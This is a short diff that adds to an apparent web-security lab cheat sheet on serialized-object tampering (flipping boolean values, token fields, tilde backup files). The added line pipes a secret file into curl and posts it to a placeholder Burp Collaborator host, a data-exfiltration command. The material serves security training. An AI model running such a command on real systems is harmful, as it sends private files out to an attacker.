@@ -27,6 +27,10 @@
 - b:0?  -> change to -> b:1 
 - access token? -> s:32<token> -> change to ->  b:1
 - backup file -> <file>~  , e.g ->  /libs/CustomTemplate.php~
+
+
+cat /home/carlos/secret.txt | curl -X POST --data-binary @- http://<BURP-COLLAB>
+
 ```
 
 
